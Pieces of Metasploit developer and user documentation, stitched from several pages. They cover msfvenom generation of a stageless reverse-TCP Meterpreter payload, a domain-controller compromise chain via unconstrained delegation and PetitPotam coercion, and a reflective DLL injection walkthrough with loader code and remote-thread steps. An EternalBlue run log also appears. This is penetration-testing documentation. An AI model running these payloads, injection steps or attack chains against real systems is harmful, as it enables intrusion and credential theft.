    "content": "Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script: . $ cat /tmp/met.py import meterpreter.transport meterpreter.transport.add(\"tcp://127.0.0.1:8000\") . This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it’s possible to add any number of transports on startup. To create a stageless payload that uses this script, we can make use of the EXTINIT parameter in msfvenom: . $ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 6412437 bytes Saved as: /tmp/met-stageless.exe . When this payload is executed, the transport is added and shown to be present in the transport list immediately: . msf exploit(handler) &gt; [*] Meterpreter session 2 opened (172.16.52.1:4445 -&gt; 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000 msf exploit(handler) &gt; sessions -i -1 [*] Starting interaction with 2... meterpreter &gt; transport list Session Expiry : @ 2015-12-20 11:06:52 ID Curr URL Comms T/O Retry Total Retry Wait -- ---- --- --------- ----------- ---------- 1 tcp://127.0.0.1:8000 300 3600 10 2 * tcp://172.16.52.1:4445 300 3600 10 . This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be. ",

    "content": "Does the extension do dynamic resolution of Python libraries at runtime? . Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the python_import command. If a module doesn’t exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it’s not known when this work will get done. When will this extension be available for other Meterpreters? . We’re not yet able to put a timeline on this. Is it possible to use the Python extension to run Responder? . Unfortunately, no it is not. Responder makes the assumption that port 445 is available for use on the target, which is why it functions nicely on *nix systems that don’t make use of this port by default. On Windows systems, port 445 is already in use by system services and hence can’t be bound to. There is a Powershell-based project that aims to do the same thing as Responder, and that is called Inveigh. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it’s recommended that this be used instead. Is it perfect? . Hell no! But the goal is to get closer and closer to perfect as we go. It’s up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks. Can I suggest a feature? . Please do, making good use of the Github issues feature. Better still, create a PR for one! . ",

The best way to diagnose these problems is simply to restart the build. Note, only Committers have rights to do this.

    "content": "Once, there was a bad merge on PR #2320. The fellow landing this pull request ran into a merge conflict while landing, thought he fixed it, and pushed the results, which ended up breaking about a dozen Rspec tests. Whoops. That was a bad merge. PR #2624 fixed it. Here’s the procedure used. Check out the bad merge tip. These commands will put the local repo back to the bad merge, and create a local branch as such: . git checkout 3996557 git checkout -b bad-merge . You can inspect exactly what commits are contained in this merge with the following: . git log bad-merge...bad-merge~ --oneline . Like so: . $ git log bad-merge...bad-merge~ --oneline 3996557 Fix conflcit lib/msf/util/exe.rb 6296c4f Merge pull request #9 from tabassassin/retab/pr/2320 d0a3ea6 Retab changes for PR #2320 bff7d0e Merge for retab 4c9e6a8 Default to exe-small . The syntax is a little wacky, but this is saying, “Show me all the commit hashes that occur from the bad-merge point to one back from bad-merge (in other words, from right before bad-merge was merged). That’s what the tilde (~) means. You could also use bad-merge^ or bad-merge^1, they’re all equivalent. You can see the diff with the following command. Note the reverse placement of the bad-merge and bad-merge~ commit points! . git diff bad-merge~ bad-merge . Take a look at that, confirm that yes, this is exactly what you want to revert, and then pull the trigger. Revert the merge . git revert -m 1 bad-merge . The -m 1 bit is important, because that specifies that you want the branch to return to the point from before the merge – I have never had reason to revert a merge and throw out the other side of the merge, but I imagine it comes up often enough for other people to not have it be the default behavior. Note that this does /not/ reach into the repo and change history; for that, you would need to git push –force, and you never want to do that on the master branch. Instead, you are generating a new commit that reverses the contents of the merge commit. As usual, you will want to edit the commit message to be meaningful – mention the affected commit hash and the affected pull request. You will also want to git commit -S --amend after this to sign the commit; git revert does not take a -S option. Bummer. Create a new PR. You will now create a new PR with your revert commit. That’s simple enough. Again, be sure that the affected PRs are also informed; they may think their material landed, and while it technically did, it’s no longer there; they will need to open new PRs and figure out how to resubmit their changes (hopefully, this time without causing merge conflicts). Bug the committers until your revert lands. Until your revert commit lands, master will remain broken, so dealing with this situation should be blocking basically anything else. Be vocal. ",

Note that the $HOME directory for Metasploit Community Edition is going to be root and not your own user directory, so if you are expecting modules to show up in the Metasploit Pro web UIs, you will want to stash your external modules in /root/.msf4/modules.

Also note that if your modules are not displaying in the web UI, you should restart Pro service. Windows . For Windows users, the above is all true, except for accessing the modules from the web GUI.

It’s possible to write modules as completely self-contained in nearly all cases (thanks to Ruby’s open class architecture), but such modules nearly always get refactored later to make the protocol and other mixin bits available to other modules. In this case, it would be better to work with modules like that using a proper GitHub checkout with a development branch – see the dev environment setup docs for tons more on that. ",

Kerberos authentication allows Metasploit users to request and utilize Ticket Granting Tickets (TGTs) and Ticket Granting Services (TGSs) to authenticate with supported modules.

A converter for Kirbi to and from CCACHE files is also available in the auxiliary/admin/kerberos/ticket_converter module.

Options . Kerberos authentication requires additional options to be set. Some of them are prefixed with the protocol the module is authenticating. For example, the PSexec module which operates over SMB would use the “SMB” prefix. Required options: . | ${Prefix}::Auth – The authentication modes this module supports. Set it to “kerberos” to use Kerberos authentication. i.e. Smb::Auth=kerberos | ${Prefix}::Rhostname – The hostname of the target system. This value should be either the hostname WIN-MIJZ318SQH or the FQDN like WIN-MIJZ318SQH.msflab.local. i.e. Smb::Rhostname=WIN-MIJZ318SQH.msflab.local | ${Prefix}Domain – The domain name of the target system, e.g. msflab.local. i.e. SmbDomain=msflab.local | . Optional options: . | DomainControllerRhost – The IP address or hostname of the domain controller to use for Kerberos authentication. i.e. DomainControllerRhost=192.168.123.13. If this value is not specified, Metasploit will look it up via the realm’s (the ${Prefix}Domain option) SRV record in DNS. | ${Prefix}::Krb5Ccname – The path to a CCACHE file to use for authentication. This is comparable to setting the KRB5CCNAME environment variable for other tools. If specified, the tickets it contains will be used. i.e. KRB5CCNAME=/path/to/Administrator.ccache. | KrbCacheMode – The cache storage mode to use, one of the following four options: . | none – No cache storage is used, new tickets are requested and no tickets are stored. | read-only – Stored tickets from the cache will be used, but no new tickets are stored. | write-only – New tickets are requested and they are stored for reuse. | read-write – Stored tickets from the cache will be used and new tickets will be stored for reuse. | . | KrbClockSkew – Adjust Kerberos timestamps by the given offset when talking to the KDC. Supports s, m, h, and d units and accepts negatives, e.g. -5m or 120s. | ${Prefix}KrbOfferedEncryptionTypes – The list of encryption types presented to the KDC as being supported by the Metasploit client. i.e. SmbKrbOfferedEncryptionTypes=AES256 | .

    "title": "Windows HTTP APIs",
    "content": "The Windows API comes with two ways to talk via HTTP/S, they are WinInet and WinHTTP. The APIs are consumed in a similar fashion; many of the functions in each have the same interface, or are at least close enough to make a transition between the two rather trivial. However, there are some underlying differences that are important. The WinInet API was designed for use in desktop applications. It provides all the features required by applications to use HTTP/S while delegating much of the responsibility of handling implementation detail to the underlying API and OS. This API can result in some user interface elements appearing if not handled correctly. WinInet comes with some limitations, one of which is that it’s close to impossible to do any kind of custom validation, parsing, or handling of SSL communications. One of the needs of Metasploit users is to be able to enable a Paranoid Mode that forces Meterpreter to only talk with the appropriate endpoint. The goal is to prevent shells from being hijacked by unauthorised users. In order to do this, one of the things that was implemented was the verification of the SHA1 hash of the SSL certificate that Meterpreter reads from the server. If this hash doesn’t match the one that Meterpreter is configured with, Meterpreter will shut down. WinInet doesn’t make this process possible without a lot of custom work. For applications such as this, WinHTTP is the “preferred” option as deemed by Microsoft. This API is designed to work under a service, and provides a greater number of ways to interact with communications made over HTTP/S. With this API it was trivial to implement the SHA1 hash verification and force Meterpreter to shut down when a MITM is detected. For a full comparison of the feature differences, please see this feature matrix on MSDN. ",

    "content": "Meterpreter now makes use of WinHTTP by default so that the new features are accommodated, but unfortuanetly this doesn’t come for free. Behind the scenes, this API does not make any use of the current user’s Internet Explorer configuration settings, where the WinInet API does. This means that if the current user has a proxy configured, extra code needs to be added to make use of the current Internet Explorer settings in WinHTTP. Meterpreter has been modified to do this, however there is still one limitation that is in place. As indicated in a blog post on MSDN: . WinHTTP strictly requires HTTP/1.1 compliance for keeping the connection alive and HTTP Keep-Alives are not supported in HTTP/1.0 protocol. HTTP Keep-Alive feature was introduced in the HTTP/1.1 protocol as per RFC 2616. The server or the proxy which expects the keep-alive should also implement the protocol correctly. WinHTTP on Windows 7, Windows 2008 R2 are strict in terms of security wrto protocol compliance. The ideal solution is to change the server/proxy to use the right protocol and be RFC compliant. What this means is that from Windows 7 and onwards, the underlying WinHTTP implementation requires proper HTTP/1.1 support from any proxies that are used. If a proxy uses HTTP/1.0, such as Squid 2.7, and requires Keep-Alive support, such as NTLM authentication, then WinHTTP will refuse to talk to it. Instead of downgrading, it will expect a purely RFC-compliant implementation, and instead will return a 407 error the client. This means that for Meterpreter to work, WinHTTP can’t be used. In order to avoid this issue, extra work has been done to force Meterpreter to fall back to WinInet when this happens. Given that WinInet doesn’t do certificate hash verification, this means that the user of Meterpreter loses the ability to use paranoid mode. It was decided that Meterpreter would not fallback to WinInet if paranoid mode was enabled, as the intention of the user is clearly to avoid MITM. To sum up, Meterpreter will use WinHTTP where it can. If it can’t, it’ll fall back to WinInet unless paranoid mode is enabled. ",

What many don’t know is that these stagers use the WinInet API, which means that they don’t get SSL certificate validation (so no paranoid mode). To provide support for paranoid mode directly inside the stager, ultimately preventing the download of Meterpreter at all in the case of MITM, new stagers were required. reverse_winhttp and reverse_winhttps are implementations of stagers that make use of WinHTTP, and in the latter case, provides support for paranoid mode. They do, however come with the same implicit limitation as Meterpreter itself in that they may not be able to provide proxy support thanks to the strict RFC compliance described in the previous section. The big difference here is that the stager does not have a fallback implementation like Meterpreter does, as this would make the stager way too big. Therefore, if an older proxy is in place that doesn’t confirm to HTTP/1.1, the stager will fail. ",

Prior to the WinInet fallback work, those people hitting the HTTP/1.0 proxy issue would find themselves with the following scenario: . | They would exploit a Windows 7 (or later) target in some way, whether it be via a browser exploit, or through a social engineering attack. | The payload that was executed was meterpreter/reverse_https, and so the initial connection would come via WinInet. | WinInet would successfully use the current user’s proxy configuration and the initial connection back to Metasploit would be successful. | The stager would download the second stage (metsrv), and reflectively load it so that Meterpreter could take over. | Meterpreter would attempt to connect again to Metasploit, this time using WinHTTP. | The proxy would return HTTP/1.0 responses, resulting in WinHTTP refusing to function. | The Meterpreter session would be considered “dead” by Metasploit as a result of the lack of successful communications after staging. | . Examples of these issues are this and this. If you are seeing similar issues it’s because your current Meterpreter binaries don’t have the fallback option. ",

Verify this using the db_status command. | . At a high-level the summary to leverage this attack chain is: . | Identify a target computer account configured with unconstrained delegation. | Compromise that target computer account to open a Meterpreter session with administrative privileges (SYSTEM works). | Coerce authentication to the compromised target from a domain controller. | Dump the Kerberos tickets from the compromised targets to obtain a TGT from the domain controller’s computer account. | Use the TGT to authenticate to the domain controller as itself (the computer account). | . Target Identification . The unconstrained delegation setting is stored as a bit flag in the userAccountControl LDAP attribute. A domain account can be used with the auxiliary/gather/ldap_query module to identify computer accounts configured for unconstrained delegation.

Now the WS01 system needs to be compromised through some means to obtain a Meterpreter session. Once a Meterpreter session has been obtained, the Domain Controller needs to be coerced into authenticating to the target. The auxiliary/scanner/dcerpc/petitpotam module can be used for this purpose. Use the module, and take care to set the LISTENER option to the hostname of the compromised host. The hostname must be used and not an IP address.

If the module does not indicate that the attack was successful, another tool like Coercer can be used to try additional methods. Now that the domain controller has authenticated to the target it’s necessary to dump the kerberos tickets from the compromised target.

Finding modules . Metasploit is based around the concept of modules. The most commonly used module types are: . | Auxiliary - Auxiliary modules do not exploit a target, but can perform data gathering or administrative tasks | Exploit - Exploit modules leverage vulnerabilities in a manner that allows the framework to execute arbitrary code on the target host | Payloads - Arbitrary code that can be executed on a remote target to perform a task, such as creating users, opening shells, etc | Post - Post modules are used after a machine has been compromised. They perform useful tasks such as gathering, collecting, or enumerating data from a session. | . You can use the search command to search for modules: . msf &gt; search type:auxiliary http html title tag Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/title normal No HTTP HTML Title Tag Content Grabber Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/title msf &gt; . You can use a Metasploit module by specifying the full module name. The prompt will be updated to indicate the currently active module: . msf &gt; use auxiliary/scanner/http/title msf auxiliary(scanner/http/title) &gt; . Running Auxiliary modules . Auxiliary modules do not exploit a target, but can perform data gathering or administrative tasks. For instance, a module extracting the HTTP title from a server: . msf &gt; use auxiliary/scanner/http/title msf auxiliary(scanner/http/title) &gt; . Each module offers configurable options which can be viewed with the show options, or aliased options, command: . msf auxiliary(scanner/http/title) &gt; show options Module options (auxiliary/scanner/http/title): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SHOW_TITLES true yes Show the titles on the console as they are grabbed SSL false no Negotiate SSL/TLS for outgoing connections STORE_NOTES true yes Store the captured information in notes.

Running exploit modules . Exploit modules require a vulnerable target. It is recommended to set up your own local test environment to run modules against. For instance in a Virtual Machine, or with Docker. There are multiple pre-built vulnerable test environments including: . | Metasploitable2 | Metasploitable3 | . For instance - targeting a vulnerable Metasploitable2 VM and using the unix/misc/distcc_exec module: . msf &gt; use unix/misc/distcc_exec [*] Using configured payload cmd/unix/reverse_bash msf exploit(unix/misc/distcc_exec) &gt; . Exploit modules will generally at a minimum require the following options to be set: . | RHOST - The remote target host address | LHOST - The listen address. Important This may need to be set to your tun0 IP address or similar, if you are connecting to your target over a VPN | PAYLOAD - The code to be executed after an exploit is successful. For instance creating a user, or a Metasploit session. Often this can be left as the default value, but may sometimes require configuration | .

    "doc": "ReflectiveDLL Injection",
    "title": "Using the ReflectiveDll loader in a metasploit module.",
    "content": "First, let’s be clear. I have used this exactly once, but there exists little in the way of guidance on how ReflectiveDll injection works in Framework, so I figure poor guidance is better than none. I am in part hoping that someone who knows how it works will come along and correct this, ala Cunningham’s Law. This documentation assumes that you have some familiarity with DLLs already. Step 1 - Make your DLL . Use Visual studio 2013 and make a standard, empty DLL. Do not attempt to add the reflective DLL stuff yet. When you make the DLL, make sure that you have at least three files: A header file with the function declarations, a c(pp) file with the functions that ‘do’ the exploit, and a DllMain file with the DllMain function. I find that testing the DLL outside the reflective loader helps tremendously, so in the header file, I declare my working function as an extern, C-style function: extern \"C\" __declspec (dllexport) void PrivEsc(void); . I think using C as the language over cpp would make life marginally easier, as you can combine the source code into one project. Using cpp meant I needed to have separate projects, or at least using my limited compiler knowledge that’s how I got it to work. I noticed OJ was able to extend his c project (exploits/capcom_sys_exec) to include the reflectiveloader, but I could not seem to do the same for my cpp project. Store your project in external/source/exploits/&lt;identifier&gt;/&lt;projectname&gt;. That’s not written in stone. The project I just finished had both DLL and EXE, so I have external/source/exploits/&lt;identifier&gt;/dll and external/source/exploits/&lt;identifier&gt;/exe. Just don’t be a jerk and do something hard to follow. Your requirements may differ, and we’re not super particular as long as it makes sense. I suggest the identifier to make life easier, then a project name because you’ll be bringing the reflective loader project into the identifier folder, and at least I like to have some separation between the two. Step 2 Write the DLL using an extern, C-linkage entry point to make testing easier . In this case, I was writing a privesc, so I called it PrivEsc because I am super-imaginative and I have done enough code maintenance that I try to be nice to the next dev. By declaring it an external function and using C-style linkages, you can test the function independently using the rundll32.exe binary. For example, if the dll were named mydll.dll, you can run the privEsc alone with the command &gt; rundll.exe mydll.dll, PrivEsc . That way, you can isolate the behavior of the exploit before adding a payload. Because I was using a privesc, I just made the last line of the privesc system(\"cmd.exe\"); so I could verify that on the target machine. If I got a system-level cmd prompt, I won! . Step 3 Add ReflectiveDLL Injection to it. This is actually pretty simple. Once your code is doing what it is supposed to do, add the ReflectiveDLL injection to it. Move the rdi (ReflectiveDLL injection) code into your existing project and add the inject project into your solution. Again, this worked for me and appears to be a popular choice. When you copy the RefelctiveDLL code into your project, you are going to replace your DllMain file with the ReflectiveDll.c file. Include the header file containing your desired entry point so that when DllMain gets launched, it can find your desired entry point. I also noticed and appreciated that others structured the code into two parts: Exploit and Exploiter. Exploiter does the heavy lifting with functions, and Exploit calls the functions and runs the shellcode after the exploit completes. For example, I made a privesc and the code required to accomplish the elevation was bundled in a function called PrivEsc contained within my Exploiter.cpp file. The Exploit file was very simple in comparison: . #include &lt;Windows.h&gt; #include \"Exploit.h\" #include \"Exploiter.h\" static VOID ExecutePayload(LPVOID lpPayload) { VOID(*lpCode)() = (VOID(*)())lpPayload; lpCode(); return; } VOID Exploit(LPVOID lpPayload) { PrivEsc(); ExecutePayload(lpPayload); } . That ExecutePayload function is there to… well…. Execute the payload. We’ll talk about it later, but make sure that you have it accepting a pointer and executing it. That’ll be how we get a payload into the running thread. All the Exploit.cpp needs to do is give a clear way for me to run the code I wanted to get system, then call the function responsible for starting the shellcode. In my case, all I needed to do was to somehow run PrivEsc and then ExecutePayload(pPayload). Sure enough, if you check out the ReflectiveDll.c file, you can see that it is really straightforward and should look a lot like your previous DllMain function, except there’s a function call in DLL_PROCESS_ATTACH: . #include \"ReflectiveLoader.h\" #include \"Exploit.h\" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) { BOOL bReturnValue = TRUE; switch (dwReason) { case DLL_QUERY_HMODULE: if (lpReserved != NULL) *(HMODULE *)lpReserved = hAppInstance; break; case DLL_PROCESS_ATTACH: hAppInstance = hinstDLL; // MessageBox(0, \"In DLLMain\", \"Status\", MB_OK); Exploit(lpReserved); break; case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return bReturnValue; } . One thing to understand- despite the feelings I had reading through the framework side, you must specify the entry point for the code you want executed in DLL_PROCESS_ATTACH. We are going to be (quasi) calling DllMain, and DLL_PROCESS_ATTACH will fire, thus giving us code execution in the remote process context. As you create the rest of your code, remember that lpReserved from DllMain will contain the address of your payload. Be sure that lpReserve has a clear path to your call of ExecutePayload(). Some of the output from the framework side of the injection was confusing to me because I am used to loading DLLs explicitly and implicitly, and some of the framework methods made it sound like we were not relying on DLL_PROCESS_ATTACH. We are, but in a slightly more round-about way. That said, remember if you go back to troubleshooting just your exploit code in the extern function, DLL_PROCESS_ATTACH will still execute if you use rundll32.exe to call your function. Be sure to comment out your calls in DLL_PROCESS_ATTACH if you go back to debugging unless you want dueling exploits. OK, so at this point, you’ve got a DLL with a function that does something you want, and even better, it compiles! Move that binary to the data directory corresponding to the external directory you used above. i.e. if you used external/source/exploits/myfancyexploit, put your binary in data/exploits/myfancyexploit/. If you can automate that move as a post build step, even better! . Now that we have the binary, we need to execute it on target- Enter Framework! . ",

OJ’s exploits/capcom_sys_exec is a great place to start looking as an examples; it is super easy and simple to read, so let’s review: . (1) Make sure you have a handle to a process. The easiest way be able to get a handle to a process is to launch your own: notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' =&gt; true}) . (2) We need to write to that process and launch a thread in the process, so let’s get a handle to the process with ALL_ACCESS attributes: process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS) .

(3.5) OJ went ahead and expanded the path; likely this is because he’s used filepath hijacking in the past: library_path = ::File.expand_path(library_path) . (4) Now, here’s where things get fun- inject your DLL directly into the memory of notepad: exploit_mem, offset = inject_dll_into_process(process, library_path) . That function allocates memory in the process and loads up the DLL. There is a second method that allows you to upload DLL data, so you could create a payload using a template and load that without the dll touching the local or remote disk, but I have not had cause to use it. Unfortunately, this is where my grasp of things gets tenuous because it departs from my experience of traditional DLL loading with LoadLibrary and GetProcAddress. We copied the DLL into the remote process memory, but we have not “loaded” it, so DLL_PROCESS_ATTACH is not executed. That’s a good thing, as we have not yet provided the payload! . I square this by basically treating it like process hollowing, but on a thread-level. Watching OJ’s ReflectiveDll injection video might help: https://www.youtube.com/watch?v=ZKznMBWUQ_c . You may want to watch it daily for a month or so. Regardless, now we have a process with our exploit DLL mapped into its memory, but not doing anything. Now we need to get the payload into the process too, so we can get exploit and payload execution. Getting the payload in there is honestly not much different that getting the DLL data in there. (5) Just allocate some RWX memory and copy the shellcode over. There’s a method for that: payload_mem = inject_into_process(process, payload.encoded) . To be clear, That’s the first time you should have dealt with the payload, because while it is annoying how much goes on in the background in Framework, when you know it is happening, Framework is awesome! . Now, if you’ve been paying attention to the return values from the above methods, we have three important values: (1) exploit_mem that has the address of the DLL loaded into memory, (2) offset that (I think) contains the offset to the DllMain function inside the DLL loaded into memory, and (3) payload_mem, that contains the address of your payload. (6) Now, With those three values, and our code stored in the process’s memory, things make a lot more sense. We just need to create a thread in the process and point it to the DllMain function with the address of our payload as the lpReserve parameter. process.thread.create(exploit_mem + offset, payload_mem) . (6) What I’m Still unclear about: (6.1) How do we get the offset value? If we check out inject_dll_into_process, it shows that it is searching the pe for ReflectiveLoader and that’s not a string I can find as an entry point. I do not understand why that gives us the offset to what I believe to be DllMain when it appears to be searching to ReflectiveLoader…? (6.2) There are a few ways to use ReflectiveDllLoader, and I wish I could read more on using it as an import like OJ does in that capcom_sys_exec. ",

Requiring root privileges may be prohibitive to user installs of MSF. How can we create a cluster without root privileges? Adding the user to the postgres group and attempting to sudo -u postgres the command, however, resulted in the same error message. Looking closer at the various commands and discovered the following in the man page for pg_wrapper. PG_CLUSTER_CONF_ROOT This specifies an alternative base directory for cluster configurations. This is usually /etc/postgresql/, but for testing/development purposes you can change this to point to e. g. your home directory, so that you can use the postgresql-common tools without root privileges. Working Solution . Create cluster (“initdb”) to set up the necessary configuration structure: . Note, running mkdir -p $HOME/.local/etc/postgresql; before the pg_createcluster command didn’t stop the “install: cannot change owner and permissions of ‘/home/msfdev/.local/etc/postgresql/9.6’: Operation not permitted” message from appearing.

Perform msfdb’s write_db_client_auth_config method work, except it needs to write the pg_hba.conf file now stored in under PG_CLUSTER_CONF_ROOT and inside the version/cluster-name directory. In this example that location is: $HOME/.local/etc/postgresql/9.6/msf/pg_hba.conf. Perform msfdb’s restart_db method work, by stopping and then starting the server.

    "title": "Describe Yourself",
    "content": "Metasploit modules include information about authors of the modules, references to other sources with information about the vulnerabilities, descriptions of the modules, options, etc. Python modules need to include this metadata information as well. The structure of the data is similar to modules written in Ruby. The following is an example template of metadata information: . metadata = { 'name': '&lt;name&gt;', 'description': ''' &lt;description&gt; ''', 'authors': [ '&lt;author&gt;', '&lt;author&gt;' ], 'date': 'YYYY-MM-DD', 'license': '&lt;license&gt;', 'references': [ {'type': 'url', 'ref': '&lt;url&gt;'}, {'type': 'cve', 'ref': 'YYYY-#'}, {'type': 'edb', 'ref': '#'}, {'type': 'aka', 'ref': '&lt;name&gt;'} ], 'type': '&lt;module type&gt;', 'options': { '&lt;name&gt;': {'type': 'address', 'description': '&lt;description&gt;', 'required': &lt;True/False&gt;, 'default': None}, '&lt;name&gt;': {'type': 'string', 'description': '&lt;description&gt;', 'required': &lt;True/False&gt;, 'default': None}, '&lt;name&gt;': {'type': 'string', 'description': '&lt;description&gt;', 'required': &lt;True/False&gt;, 'default': None} } } . Module Type . As shown in the metadata template information, a type is also include for the module. The module type is used to select an ERB template, which generates a Ruby document for the module. The ERB templates can be found here. The following templates are currently available: . remote_exploit_cmd_stager capture_server dos single_scanner multi_scanner . The remote_exploit_cmd_stager module type is used when writing an exploit for command execution or code injection vulnerabilities and provides the command to inject into the vulnerable code based on the flavor specified for the command stager. The capture_server module type is used when a module is designed to simulate a service to capture credentials for connecting clients. The dos module type is used when the module will send packets to a remote service that will crash the service or put it in an unusable state. The single_scanner module type is used when creating a module to scan hosts without batching. The multi_scanner module type is used for modules that are going to scan hosts in batches. The batch_size option is registered in the mutli_scanner ERB template with a default of 200. Options . The options dictionary in the metadata are the options that will be available in msfconsole when the module is loaded. The options can be required (necessary for the module to run) or not (provide additional functionality). Communication . To pass the metadata information, as well as the starting function of your Python module, to msfconsole, use the module.run() function. The module.run() function takes two arguments, the first is the metadata and the second is the callback function to use when executing the module from msfconsole. The code snippet will look like the following: . def run(args): # Your code here pass if __name__ == '__main__': module.run(metadata, run) . When msfconsole sends a describe request to the Python module, the metadata information is returned. When msfconsole sends a run request to the module, the callback function, run in this example, will be called with the arguments provided to msfconsole. A LogHandler can be setup and used to communicate status information back to framework during execution of the Python module. Here is code snippet that uses the LogHandler: . import logging from metasploit import module module.LogHandler.setup(msg_prefix='logging test: ') logging.info('info') logging.error('error') logging.warning('warning') logging.debug('debug') . The module.LogHandler.setup() function is used the create a Handler and Formatter that will call module.log() with the appropriate log level. ",

The example sends a get request to the given rhost and targeturi, then calls logging.info() on the result to have the output displayed in msfconsole. Debugging Python modules . If you want to run an external module as a standalone program from your metasploit-framework folder just specify the Python path to include the Metasploit library support and run the module directly: . $ PYTHONPATH=./lib/msf/core/modules/external/python:$PYTHONPATH python3 ./modules/auxiliary/scanner/wproxy/att_open_proxy.py . The Python module will wait for stdin to receive JSON-RPC input. Entering the request to run the module: . { \"jsonrpc\": \"2.0\", \"id\": \"1337\", \"method\": \"run\", \"params\": { \"rhosts\": [\"127.0.0.1\"], \"rport\": \"49152\" } } . You will see the JSON-RPC responses printed to stdout: . {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"debug\", \"message\": \"127.0.0.1:49152 - Connected\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"debug\", \"message\": \"127.0.0.1:49152 - Received 5 bytes\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"127.0.0.1:49152 - Does not match\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"debug\", \"message\": \"127.0.0.1:49152 - Does not match with: bytearray(b'xxxxx')\"}} . You can pipe the JSON-RPC request as well for automation purposes: . echo '{ \"jsonrpc\": \"2.0\", \"id\": \"1337\", \"method\": \"run\", \"params\": { \"rhosts\": [\"127.0.0.1\"], \"rport\": \"49152\" } }' | PYTHONPATH=./lib/msf/core/modules/external/python:$PYTHONPATH python3 ./modules/auxiliary/scanner/wproxy/att_open_proxy.py . The Python external modules can be run directly with command line options: . $ PYTHONPATH=./lib/msf/core/modules/external/python:$PYTHONPATH python3.9 ./modules/auxiliary/scanner/wproxy/att_open_proxy.py --help usage: att_open_proxy.py [-h] --rhosts RHOSTS [--rport RPORT] [ACTION] The Arris NVG589 and NVG599 routers configured with AT&amp;T U-verse firmware 9.2.2h0d83 expose an un-authenticated proxy that allows connecting from WAN to LAN by MAC address. positional arguments: ACTION The action to take (['run']) optional arguments: -h, --help show this help message and exit --rport RPORT The target port, (default: 49152) required arguments: --rhosts RHOSTS The target address . For example: . PYTHONPATH=./lib/msf/core/modules/external/python:$PYTHONPATH python3 ./modules/auxiliary/scanner/wproxy/att_open_proxy.py --rhosts 127.0.0.1 --rport 49152 . For exploit modules, the payload is encoded encoded using Base64 and specified in a top level payload_encoded key, implemented here. Below is an example of the (now deleted) ms17_010_eternalblue_win8.py module running: . $ cat options.json { \"jsonrpc\": \"2.0\", \"id\": \"1337\", \"method\": \"run\", \"params\": { \"VERBOSE\": true, \"RHOST\": \"192.168.144.131\", \"RPORT\": \"445\", \"GroomAllocations\": 13, \"ProcessName\": \"spoolsv.exe\", \"SMBUser\": \"test\", \"SMBPass\": \"123456\", \"payload_encoded\": \"/EiD5PDozAAA...etc...===\" } } $ cat options.json | PYTHONPATH=./lib/msf/core/modules/external/python:$PYTHONPATH python3 modules/exploits/windows/smb/ms17_010_eternalblue_win8.py {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"shellcode size: 1221\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"numGroomConn: 13\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"Target OS: Windows 10 Pro 10240\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"got good NT Trans response\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"got good NT Trans response\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"SMB1 session setup allocate nonpaged pool success\"}} {\"jsonrpc\": \"2.0\", \"method\": \"message\", \"params\": {\"level\": \"info\", \"message\": \"SMB1 session setup allocate nonpaged pool success\"}} . To add breakpoints to your Python code, add the below code snippet. Note that the interactive breakpoints will only work when running the external modules as standalone Python scripts, and won’t work when running from msfconsole: . import pdb; pdb.pry . ",

